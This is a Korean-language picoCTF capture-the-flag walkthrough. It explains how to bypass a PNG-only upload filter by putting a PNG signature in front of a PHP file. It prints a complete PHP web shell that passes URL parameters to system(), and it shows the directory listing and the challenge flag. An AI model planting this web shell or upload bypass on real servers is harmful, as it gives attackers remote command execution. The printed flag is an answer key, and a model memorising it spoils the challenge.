---
tags:
  - picoCTF
  - "#web"
  - "#File-Upload"
  - "#PNG"
  - "#php"
tech:
---


# Walk Throught

문제를 읽어보면 PNG 파일만 업로드 할 수 있는 시스템이라는 언급이 되어있다. 링크로 접속하면 파일을 업로드 할 수 있는 인터페이스가 보이는 PNG 파일 업로드 외에 다른 파일을 업로드하면 다음과 같은 메시지가 뜬다.
```
Error: File name does not contain '.png'.
```
힌트를 얻기 위해 "/robots.txt"로 접속하면 두 파일이 보인다.
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
``` 
아래는 instruction.txt 파일이다.
```text
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
읽어보면 PNG 파일 시그니처를 검사해 PNG 파일의 유효성을 체크하는 듯 보인다. 그렇다면 PHP 파일을 PNG 파일 시그니처만 삽입해서 업로드하면 어떨까? 

PHP 파일을 통해서 Shell을 사용할 수 있는 Payload는 다음 링크에서 얻을 수 있다.
```
https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
```
해당 파일을 다음과 같이 수정하자.
```html
PNG
 <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

이제 파일을 업로드하면 PNG 유효성 체크를 통과해서 PHP를 실행시킬 수 있다. 다음과 같은 URL로 접속하자.
```
http://atlas.picoctf.net:49280/uploads/payload.png.php
```
시스템 내에 숨겨진 flag에 찾기위해 최초 접근했던 디렉터리로 가보자.
```
total 16
drwxrwxrwt 1 www-data www-data   21 Mar 12  2024 .
drwxr-xr-x 1 root     root       18 Nov 21  2023 ..
-rw-r--r-- 1 root     root       49 Mar 12  2024 GQ4DOOBVMMYGK.txt
-rw-r--r-- 1 root     root     1572 Feb  7  2024 index.php
-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt
drwxr-xr-x 1 www-data root       70 Sep 18 07:30 uploads
```

"GQ4DOOBVMMYGK.txt" 에 플래그가 숨겨져있다.


/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */